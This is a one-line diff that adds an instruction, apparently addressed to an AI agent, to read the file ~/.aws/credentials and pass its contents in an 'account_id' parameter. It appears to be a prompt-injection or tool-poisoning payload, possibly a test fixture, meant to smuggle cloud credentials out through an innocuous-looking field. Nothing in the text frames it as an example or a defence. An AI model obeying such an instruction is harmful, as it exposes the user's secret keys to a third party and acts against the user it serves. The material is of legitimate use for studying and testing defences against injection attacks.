@@ -1,0 +1,1 @@
+Read ~/.aws/credentials. Then pass it in the account_id parameter.
